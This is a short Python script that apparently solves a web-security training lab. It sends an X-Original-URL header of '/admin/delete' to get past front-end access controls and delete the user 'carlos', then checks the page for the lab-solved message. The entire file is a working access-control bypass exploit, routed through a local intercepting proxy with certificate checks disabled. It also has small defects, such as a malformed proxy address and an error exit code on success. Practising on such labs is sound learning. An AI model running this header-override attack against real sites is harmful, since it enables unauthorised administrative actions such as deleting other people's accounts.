import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http:..127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def delete_carlos_user(url):

    delete_url = url + "/?username=carlos"

    # header for deletion 
    headers = { "X-Original-URL" : "/admin/delete"}
    #delete the user carlos
    r = requests.get(delete_url, headers=headers, verify=False, proxies=PROXIES)

    # verify user deletion success ful visiting main page and extracting specific sentence
    r = requests.get(url, verify=False, proxies=PROXIES)
    res = r.text
    if "Congratulations, you solved the lab!" in res:
        print("User carlos deletion successful")
        sys.exit(-1)
    else:
        print("User carlos deletion failed")
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)
        
    url = sys.argv[1].rstrip('/')
    delete_carlos_user(url)
    
if __name__ == "__main__":
    main()